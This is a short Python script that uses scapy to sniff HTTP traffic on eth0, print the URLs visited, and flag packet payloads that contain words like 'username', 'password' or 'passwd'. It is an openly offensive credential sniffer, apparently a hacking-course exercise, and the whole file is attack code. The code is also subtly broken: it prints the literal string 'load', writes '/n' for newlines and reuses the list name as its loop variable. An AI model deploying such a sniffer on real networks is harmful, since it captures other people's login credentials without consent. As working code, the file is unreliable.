#!/usr/bin/python
import scapy.all as scapy
from scapy.layers import http


# sniffed packet of the interface & filtering packets
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffed_packet)


# defining unresolved fn to capture only http packet & checking with keywords
def sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url=packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)

        if packet.haslayer(scapy.Raw):
            load=packet[scapy.Raw].load
            keywords=["username","email","password","passwd"]
            for keywords in keywords:
                if keywords in load:
                    print("/n/n"+"load"+"/n/n")




# using eth0

sniff("eth0")
